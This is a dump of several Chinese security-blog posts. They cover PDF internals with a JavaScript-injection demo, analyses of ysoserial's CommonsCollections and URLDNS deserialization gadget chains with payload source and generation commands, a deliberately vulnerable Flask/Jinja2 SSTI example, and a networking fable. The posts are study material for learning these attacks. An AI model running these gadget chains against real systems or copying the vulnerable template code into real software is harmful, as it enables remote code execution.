\u0026lt;\u0026lt;/Pages 2 0 R /Type /Catalog\u0026gt;\u0026gt; endobj 一、indirect obejct1 0 object\n序号\n版本\n类型\n二、dictionary object \u0026lt;\u0026lt;/Pages 2 0 R /Type /Catalog\u0026gt;\u0026gt;\n\u0026lt;\u0026lt; \u0026gt;\u0026gt;是dictionary object的标识符，里面包括了key和对应的value。同时key is always NAME object 为/pages设置2 0 R的值：一个对对象的引用，指向页面树的对象 2 -\u0026gt; 对象编号 0 -\u0026gt; 对象版本 R -\u0026gt; R number 为/Type设置/Catalog的值，意味着这个对象的Type是Catalog，PDF文档的目录对象 三、Stream Object\n图像、字体、加密数据、多媒体文件、自定义数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 4 0 obj \u0026lt;\u0026lt;/Filter [/ASCII85Decode /FlateDecode] /Length 135\u0026gt;\u0026gt; stream GapQh0E=F,0U\\H3T\\pNYT^QKk?tc\u0026gt;IP,;W#U1^23ihPEM_?CW4KISi90MjG^2,FS#\u0026lt;RC5+c,n)Z;(0Q-/62bF7\u0026#34;kUW2hghHOphMt`3R\u0026gt;\u0026gt;jJ\u0026#39;kM\u0026amp;k,NKO=Z(s/W_[o\u0026gt;QCEF)jp~\u0026gt; endstream endobj \u0026lt;\u0026lt;/Filter [/ASCII85Decode /FlateDecode] /Length 135\u0026gt;\u0026gt;： /Filter [/ASCII85Decode /FlateDecode]：使用前者编码使用后者压缩 /Length 135：流数据的长度135 四、\n还有一种对于纯文本的\n1 2 3 4 5 6 7 8 9 10 4 0 obj \u0026lt;\u0026lt; /Length 44\u0026gt;\u0026gt; --- from BT to ET includes white space and new lines characters stream BT /F1 100 Tf --- /F1 is font name, 100 is font size, and Tf is TextFont operator 10 4000 Td --- x and y coordinates and Td is Text cursor operator (hello world!) Tj --- text string ET endstream endobj 比起上面的会多了BT和ET两个标签，Begin of Text， End of Text。就这样。\nXREF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 xref 0 7 0000000000 65535 f 0000000015 00000 n 0000000062 00000 n 0000000117 00000 n 0000000301 00000 n 0000000523 00000 n 0000000552 00000 n trailer \u0026lt;\u0026lt;/Root 1 0 R /Size 7\u0026gt;\u0026gt; startxref 659 --- as xref\u0026#39;s pffset %%EOF xref 后面是起始索引和对象数量。 每行一个对象，长度为 20 字节，包含换行符。 每行以 00000 n 结尾，其语法为 xxx...(10位) yyy...(5位) a(1字母)。 10 位：对象的偏移量。 5 位：代号，首行为 65535。 1 字母：f 表示_空闲_，n 表示_正在使用_。 以上就是对PDF的简单认识。\nPDF with JavaScript 使用JS2PDFInjection添加javascript:\n1 2 3 4 5 6 real@real-virtual-machine:~/xxx/JS2PDFInjector$ java -jar JS2PDFInjector.jar /xxx/ppp/ppock/simple_pdf.pdf /xxx/ppp/ppock/pdfD/po.js [*] Original PDF: /xxx/ppp/ppock/simple_pdf.pdf [*] JavaScript Payload: /xxx/ppp/ppock/pdfD/po.js [*] Output File Path: /xxx/ppp/ppock/js_injected_simple_pdf.pdf [*] Poisoned File Created: /xxx/ppp/ppock/js_injected_simple_pdf.pdf 生成的含有js的pdf从raw text看实际上是多了\n1 2 3 4 5 6 7 3 0 obj \u0026lt;\u0026lt; /Type /Action /S /JavaScript /JS (app.alert\\(\u0026#34;hello\u0026#34;\\)) \u0026gt;\u0026gt; endobj 可以看到是将JavaScript写入了文档的结构树中。\n当用浏览器打开该PDF文件的时候：\n","date":"2024-11-05T13:22:24+08:00","image":"https://66lueflam144.github.io/p/pdf_tricks/pdf1_hu16413613386345109207.jpg","permalink":"https://66lueflam144.github.io/p/pdf_tricks/","title":"Pdf_tricks"},{"content":"CommonsCollections1 测试使用 写了最简单基础的反序列化代码\n原因：\nysoserial直接生成的是序列化过的代码 想知道作用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import org.apache.commons.collections.map.LazyMap; public class end { public static void main(String[] args) { try{ ObjectInputStream obiIn = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;/home/real/Downloads/summer.bin\u0026#34;))); Object x = obiIn.readObject(); obiIn.close(); } catch (ClassNotFoundException | IOException e) { throw new RuntimeException(e); } } } java -jar ysoserial-all.jar CommonsCollections1 gnome-calculator \u0026gt; summer.bin\n效果如下：\n经过反序列化成功召唤了计算器\n那个报错是 尝试将一个 Integer 对象转换为 Set 类型\n虽然运行exit with code -1但是并不耽误其被召唤。所以错误和反序列化中召唤部分估计无关。\n分析 java -jar ysoserial-all.jar CommonsCollections1 gnome-calculator \u0026gt; summer.bin\n使用的是 CommonsCollections1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload\u0026lt;InvocationHandler\u0026gt; { public CommonsCollections1() { } public InvocationHandler getObject(String command) throws Exception { String[] execArgs = new String[]{command}; //第一部分 Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)}); Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, execArgs), new ConstantTransformer(1)}; //第二部分 Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Map mapProxy = (Map)Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]); //第三部分 InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); //第四部分 Reflections.setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); return handler; } public static void main(String[] args) throws Exception { PayloadRunner.run(CommonsCollections1.class, args); } public static boolean isApplicableJavaVersion() { return JavaVersion.isAnnInvHUniversalMethodImpl(); } } 第一部分： 1 2 3 4 5 6 7 Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)}); Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, execArgs), new ConstantTransformer(1)}; ConstantTransformer和ChainedTransformer定义\n1 2 3 4 5 6 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } 这个套娃和层次令人感动：\nTransformer transformerChain ChainedTransformer Transformer[] ConstantTransformer Transformer[] transformers Transformer[] ConstantTransformer Runtime.class InvokerTransformer getMethod Object[] getRuntime InvokerTransformer invoke InvokerTransformer exec ConstantTransformer 对比可以看出，\nTransformer transformerChain 是一个数组，里面有一个元素\nTransformer[] transformers 是一个反射调用类的方法数组， 反射调用Runtime\n第二部分 1 2 3 Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Map mapProxy = (Map)Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]); LazyMap相关\n1 2 3 4 5 6 7 8 9 10 11 12 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\u0026#34;Factory must not be null\u0026#34;); } else { this.factory = factory; } } 前两个Map类实例对象就是分别创建了一个Map\ninnerMap——-HashMap lazyMap——LazyMap，用innerMap和（第一部分）transformerChain装饰（创建） 两者的writeObject、readObject、get方法存在差别。\nHashMap更多的是对key和value的处理，LazyMap是对一个Map类对象的处理。\nGadgets相关\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public static \u0026lt;T\u0026gt; T createMemoitizedProxy(Map\u0026lt;String, Object\u0026gt; map, Class\u0026lt;T\u0026gt; iface, Class\u0026lt;?\u0026gt;... ifaces) throws Exception { return createProxy(createMemoizedInvocationHandler(map), iface, ifaces); } public static InvocationHandler createMemoizedInvocationHandler(Map\u0026lt;String, Object\u0026gt; map) throws Exception { return (InvocationHandler)Reflections.getFirstCtor(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).newInstance(Override.class, map); } public static \u0026lt;T\u0026gt; T createProxy(InvocationHandler ih, Class\u0026lt;T\u0026gt; iface, Class\u0026lt;?\u0026gt;... ifaces) { Class\u0026lt;?\u0026gt;[] allIfaces = (Class[])((Class[])Array.newInstance(Class.class, ifaces.length + 1)); allIfaces[0] = iface; if (ifaces.length \u0026gt; 0) { System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length); } return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih)); } mapProxy则实例化了一个通过反射创建的实例在内作为参数的Proxy：\n能够根据传递的映射 map 来执行方法调用，并可能实现某种记忆化（缓存）行为。\n第三部分 1 2 3 //第三部分 InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); Gadgets相关\n1 2 3 public static InvocationHandler createMemoizedInvocationHandler(Map\u0026lt;String, Object\u0026gt; map) throws Exception { return (InvocationHandler)Reflections.getFirstCtor(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).newInstance(Override.class, map); } handler是一个指定类实例，指定的Proxy实例作为参数,，也即是上面第二部分的mapProxy\n第四部分 1 2 3 Reflections.setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); Reflections相关\n对Object的value进行设置\n1 2 3 4 5 6 7 8 9 public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public void set(Object obj, Object value) throws IllegalArgumentException, IllegalAccessException { getFieldAccessor(obj).set(obj, value); } FINAL handler是最终返回的一个结果，\n通过mapProxy创建 通过lazyMap创建 transformerChain创建 通过Reflections.setFieldValue更新transformerChain的内容 前面一直在提一个“指定的类”，就是sun.reflect.annotation.AnnotationInvocationHandler，不过无所谓，反正最后会被序列化，进行反序列化的是handler\nCommonsCollections2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class CommonsCollections2 implements ObjectPayload\u0026lt;Queue\u0026lt;Object\u0026gt;\u0026gt; { public CommonsCollections2() { } public Queue\u0026lt;Object\u0026gt; getObject(String command) throws Exception { Object templates = Gadgets.createTemplatesImpl(command); InvokerTransformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, new Class[0], new Object[0]); PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue(2, new TransformingComparator(transformer)); queue.add(1); queue.add(1); Reflections.setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); Object[] queueArray = (Object[])((Object[])Reflections.getFieldValue(queue, \u0026#34;queue\u0026#34;)); queueArray[0] = templates; queueArray[1] = 1; return queue; } public static void main(String[] args) throws Exception { PayloadRunner.run(CommonsCollections2.class, args); } } 大同小异的，这个使用的是队列（优先）。\n后面的几个commonsCollections系列的也大同小异。思路是一致的。\nFinal 1.0 虽然简单来说是使用最经典的反射+反序列化来实现的，但具体来看还是比较复杂的。\n其中用数组或者队列来显式或者隐式调用Runtime.class，使之在反序列化后按照一定顺序执行最终实现危险调用的实现，very funny。\n","date":"2024-10-05T21:40:34+08:00","permalink":"https://66lueflam144.github.io/p/ysoserial_commoncolllections-01/","title":"Ysoserial_CommonColllections 01"},{"content":"Ysoserial\u0026mdash;URLDNS Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是 ObjectOutputStream ，开发者可以将任何内容写入这个stream中；\n反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。\n序列化代码示例 一个简单的代码，简单实现了一下readObject()方法和writeObject()方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package com.example.ballet.SerializationTest; import java.io.*; public class MainTest implements Serializable{ //这个是构造函数，不这样写也可以，就是copy的代码里面这样写的就懒得改了 private int n; public MainTest(int n) { this.n = n; } @Override public String toString(){ return \u0026#34;deserialize [n=\u0026#34; + n + \u0026#34; , getClass() = \u0026#34; + getClass() + \u0026#34; , hashcode() = \u0026#34; + hashCode() + \u0026#34; , toString() = \u0026#34; + super.toString() + \u0026#34;]\u0026#34;; } //自定义readObject方法 private void readObject(ObjectInputStream objIn) throws IOException, ClassNotFoundException { objIn.defaultReadObject(); //Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); System.out.println(\u0026#34;TEST\u0026#34;); } //操作类，包含序列化和反序列化方法 class operation1{ //序列化 public static void serialize(Object obj) { try { ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(\u0026#34;object.bin\u0026#34;)); objOut.writeObject(obj); objOut.flush(); objOut.close(); } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } //反序列化 public static void deserialize(){ try{ ObjectInputStream obiIn = new ObjectInputStream(new FileInputStream(\u0026#34;object.bin\u0026#34;)); Object x = obiIn.readObject(); obiIn.close(); } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } catch (ClassNotFoundException e) { throw new RuntimeException(e); } } } public static void main(String[] args) { MainTest x = new MainTest(5); operation1.serialize(x); operation1.deserialize(); System.out.printf(x.toString()); } } 上述代码只是套皮了一下序列化和反序列化的皮，在改写的readObject中有个Runtime.exec，当反序列化执行到readObject方法的时候就会执行。\n后续进行对ysoserial的测试的时候，将Runtime注释掉 测试只用到deserialize()方法\n1 java -jar ysoserial-all.jar URLDNS http://e7m4ck6e288csewnfwxjwlgbt2ztnlba.oastify.com \u0026gt; poc.bin 这条命令会生成一个序列化过的恶意代码，经过反序列化后执行，向指定的URL进行DNS查询 我用的是burpsuite的，所以可以看到如下的结果\n后面的基本也就是这个usage。 浏览器里面基本都在关注调用链，只有我在疑惑这个要怎么用。心寒。\n不过遇到一个问题 ===invalid stream header: FFFE08E1=== 使用powershell生成的时候，前面几次开头都是Java的AECD，后面几次就变成了错误的开头。\n好了现在说调用链，很值得研究的东西一个\n调用链 起作用的是最终反序列化且输出结果的方法 在URLDNS源代码中 这个方法起到了作用：\ngetObject 1 2 3 4 5 6 7 8 public Object getObject(String url) throws Exception { URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL((URL)null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); return ht; } 返回的内容是一个HashMap 根据上面的话，HashMap ht这个对象是序列化和反序列化的关键。\nreadObject 其中HashMap类中有readObject这个方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 @java.io.Serial private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 代码的最后几行，作为ObjectInputStream s也调用了readObject()方法，但这不是HashMap的，是ObjectInputStream的\n主要作用：Internal method to read an object from the ObjectInputStream of the expected type. Called only from readObject() and readString(). Only Object.class and String.class are supported.\nputVal() \u0026amp; hash() 其实查看源代码ht.put(u, url); 这里就会自然而然来到这一步。（在调试过程中readObject确实step into。。。调试有些小问题待解决。。）\nput()方法是对于键值对的值的操作\n1 2 3 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 可以看到也是putVal和hash方法结合，不过在putVal的参数上有区别。\n顺着下去：\nputVal是往HashMap中放入键值对的方法 hash()对key进行处理： 1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 这里可以看到key调用了hashCode()方法， 对这个key的理解需要结合实际：\nht.put(u, url); key是URL实例u，value是String实例url\n所以寻找URL类的hashCode方法\n1 2 3 4 5 6 7 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } handler.hashCode()方法就是进行hash计算。\n里面Generate the host part部分通过InetAddress addr = getHostAddress(u); 调用getHostAddress()方法，根据主机名查找IP——DNS查询\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 protected synchronized InetAddress getHostAddress(URL u) { if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.isEmpty()) { return null; } else { try { u.hostAddress = InetAddress.getByName(host); } catch (UnknownHostException ex) { return null; } catch (SecurityException se) { return null; } } return u.hostAddress; } 到这里也就实现了URLDNS。\n总结一下 ===URLDNS通过getObject方法进行操作===\nreadObject对序列化内容进行读取 put方法调用putVal和hashCode putVal将readObject读取的内容写入ht hashCode进行hash计算的同时进行了DNS请求 1 2 3 4 5 6 HashMap-\u0026gt;readObject() HashMap-\u0026gt;hash() URL-\u0026gt;hashCode() URLStreamHandler-\u0026gt;hashCode() URLStreamHandler-\u0026gt;getHostAddress() InetAddress-\u0026gt;getByName( Java反序列化 — URLDNS利用链分析 - 先知社区 (aliyun.com) 这个比较详细完整，值得看了研究一下。\n“链式反应” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;})}; Transformer transformedChain = new ChainedTransformer(transformers); Map innerMap = new hashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;value\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\u0026#34;foobar\u0026#34;); } ==onlyElement对象的包装过程：==\n1 2 3 4 5 graph LR A[TransformedMap] -- innerMap + transformedChain --\u0026gt; B[outerMap] B --\u0026gt; D{onlyElement} C[transformers] -- ChainedTransformer --\u0026gt; E[transformedChain] ==触发==\n当上面的代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：\n首先通过ConstantTransformer获得Runtime类 进一步通过反射调用getMethod找到invoke函数 最后再运行命令calc.exe。 而后面level up的POC使用AnnotationInvocationHandler是因为该类的readObject方法中增加了关于触发条件setValue的调用。 也就是说，之前需要通过调用Map对象的setValue方法，现在在readObject方法中就有该方法，在进行序列化时，就会触发setValue方法，进而触发transform变换。\n","date":"2024-10-05T21:40:34+08:00","permalink":"https://66lueflam144.github.io/p/184ceac/","title":"Ysoserial_URLDNS"},{"content":"PYTHON Flask 示例代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from flask import Flask, request from jinja2 import Template app = Flask(__name__) app.config[\u0026#39;See\u0026#39;] = \u0026#34;passwd:12345\u0026#34; @app.route(\u0026#34;/\u0026#34;) def index(): name = request.args.get(\u0026#39;name\u0026#39;, \u0026#39;guest\u0026#39;) t = Template(\u0026#39;\u0026#39;\u0026#39; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;SSTI_TEST\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;hello, %s\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; % (name)) return t.render() if __name__ == \u0026#34;__main__\u0026#34;: app.run() 简单运行结果：\n当name={{5*6}}的时候，就会显示hello,30。\n说明name的参数被执行。\nSSTI的关键词就是，参数被执行。\n关于为什么会被执行，简单的说法就是，输入的内容，先加入渲染，然后一起输出。\n一个不会出现SSTI的示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from flask import Flask, request from jinja2 import Template app = Flask(__name__) app.config[\u0026#39;See\u0026#39;] = \u0026#34;passwd:12345\u0026#34; @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;, title=\u0026#34;SSTI_TEST\u0026#34;, name=request.args.get(\u0026#34;name\u0026#34;)) if __name__ == \u0026#34;__main__\u0026#34;: app.run() 1 2 3 4 5 6 7 8 9 //index.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{{title}} - cl4y\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, {{name}} !\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 服务器先将前端的index.html渲染，然后从后端获取用户输入——就像往空缺的地方搭积木一样放进去，就只是放进去，不会参与解析渲染。 Jinja2 一个python的模板引擎，被广泛利用\n在上面的代码示例中就使用了Jinja2，不过造成SSTI的不是Jinja2本身代码哪里有错误，而是，用户的使用不当。 也就是：\nJinja2作为一个模板引擎，其设计允许在模板中执行复杂的表达式和调用Python函数，这为其提供了强大的功能性，但也带来了安全风险。如果未能正确处理用户输入，这些强大的功能就可能被攻击者利用，从而导致SSTI漏洞。\nJinja2语法简介：\n假设layout.html\nJinja2渲染时候，会将标记着 {和百分号 的部分进行插值 假如传入的user列表如下：\n1 2 3 4 5 users = [ {\u0026#34;username\u0026#34;: \u0026#34;alice\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;/users/alice\u0026#34;}, {\u0026#34;username\u0026#34;: \u0026#34;bob\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;/users/bob\u0026#34;}, {\u0026#34;username\u0026#34;: \u0026#34;carol\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;/users/carol\u0026#34;} ] 最终就会呈现下面的效果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;nav\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/about\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;main\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/users/alice\u0026#34;\u0026gt;alice\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/users/bob\u0026#34;\u0026gt;bob\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/users/carol\u0026#34;\u0026gt;carol\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/main\u0026gt; ","date":"2024-06-03T21:07:02+08:00","permalink":"https://66lueflam144.github.io/p/f9ce7b3/","title":"SSTI"},{"content":"一个故事 简单来说就是如何从伊邪那美和伊邪那歧发展到奥林匹克山上一家的。\n伊邪那家族最开始只有两个人\n一对一交流，即使可能要绕柱走也没什么。\n这个时候就是很安详的，you send i receive。\n子神加入\n多了一个，三人三线依旧够用。 再多一个，四人六线凑合。 再多一个，给大家画个五角星吧…… …… 越来越多，联系越来越复杂，最后编成了无法解开的线团……\n所以出现了新装备——集线器\n大家的线都连到集线器上面，通知大家吃午饭就方便多了\n因为只要往里面发一个“吃午饭”的消息，所有连到这个集线器上的人都可以收到这个消息。 就像一个公告栏。 就这么安稳的生活了一阵子。 蛐蛐别人于是升级1.0\n某天子神A想和子神B 蛐蛐 子神C，由于大家比较蠢得可以，A直接往集线器上发了蛐蛐消息，于是大家就都看见了。\nA尴尬得连夜逃离家族。\n两位祖宗觉得虽然但是——是集线器的错误。所以动手改造。\n改造内容如下：\n往集线器发消息前，一定要加一个source和destination标识，简单称为MAC地址，遵守不可修改的最高宪法 收到消息的，确认destination是不是自己，不是就忽略，否则就查收。 大家觉得很好。 于是就这么愉快的过了段时间。 偷看消息于是升级2.0\n由于世风日下，人心不古，发现居然有人偷看消息，家族紧急召开家族会议，围绕“虽然偷看不好但是一定是集线器的错”主题开展，对集线器再次升级。\n升级内容如下：\n指定一个MAC在升级后的集线器占一个端口，按照source的MAC指定的端口发出，destination指定的MAC的端口接收，转过来也是一样的。 升级后的集线器叫交换机，里面内置MAC地址表。 考虑到家族人数逐渐指数级庞大，所以需要多个交换机。\n族长拿着生物遗传图谱来参考，以家庭为单位进行分组，一组连接一个交换机。\n然后多个交换机之间进行连接，以完成跨家庭的消息通信。 例子：\n在aa家的交换机的内置MAC表部分（请注意这个部分）就会是这样的：\nMAC 端口 aa-aa 1 aa-bb 2 aa-cc 3 aa-dd 4 bb-aa 5 bb-bb 5 bb-cc 5 注意，bb的和aa的不是一个家庭套餐，所以bb连接的是另一个交换机，而交换机互联，在这里独占的端口是5\nbb家的交换机内置MAC表也同理。\n延迟过高引发不满\n因为家庭太多（从a到zzzzzzzzzzz），家庭成员也太多（从a到zzzzzzzzz），MAC表一眼望不到头，交换机在查询的时候堪比海里捞针，交换机终于发起了轰轰烈烈的罢工运动。\n于是，家族又时隔很久，开了家族会议。\n他们决定给交换机找助手。\n于是找来了路由器，一个专门给交换机当交换机的交换机。（不是绕口令）\n同时为了表示支持路由器的工作，为其将消息格式也进行了升级，增加了一个叫IP的东西。\n这么一个情景来理解路由器的日常工作\nA和B在交换机1上，C和D在交换机2上 A想发消息给D A发消息出去，交换机1 没在MAC表上找到匹配的D的MAC-端口 交换机1 把消息发给路由器 路由器面对的都是交换机，它只有交换机的地址，它怎么知道D在哪个交换机上？IP的意义就在在这里。 路由器在接收到消息的时候，就查看IP，查询内置的路由表，来识别要转发到哪个交换机上。belike（192.169.0.1，看到前面的192.169.0就知道是哪台交换机作为接收者了，最后的1是指在交换机中的哪个端口） HAPPY ENDING!!! 故事的注解 这个故事有点偏专业术语点\n首先来引用一句话\n从计算机发送出来的网络包，会通过集线器、路由器等设备被转发，最终到达目的地。\n转发设备会根据包头部中的控制信息，在转发设备内部一个写有转发规则的表中进行查询，以此来判断包的目的地，讲包朝目的地方向进行转发。\n以太网\n一种为多台计算机能够彼此自由和廉价地相互通信而设计的通信技术\n关键词：\nMAC头部、MAC地址 以太类型：是一个在以太网帧中的占用两字节的字段，这一字段代表了在以太网帧中封装\u0026quot;)了何种协议。（简单举例，IPV4） 三个性质：\n将包发送到 MAC 头部的接收方 MAC 地址代表的目的地 用发送方 MAC 地址识别发送方 用以太类型识别包的内容。 以太网并不关心包的实际内容，只关心发送。\n在上面那个家族发展通讯的故事中，升级到2.0版本时候，组成的网络布局就是以太网级别。\nMAC\n地址 网卡的 ROM 中保存着全世界唯一的 MAC 地址，这是在生产网卡时写入的，将这个值读出之后就可以对 MAC 模块进行设置，MAC 模块就知道自己对应的 MAC 地址了。 MAC地址长度为48bit，用十六进制表示\n头部 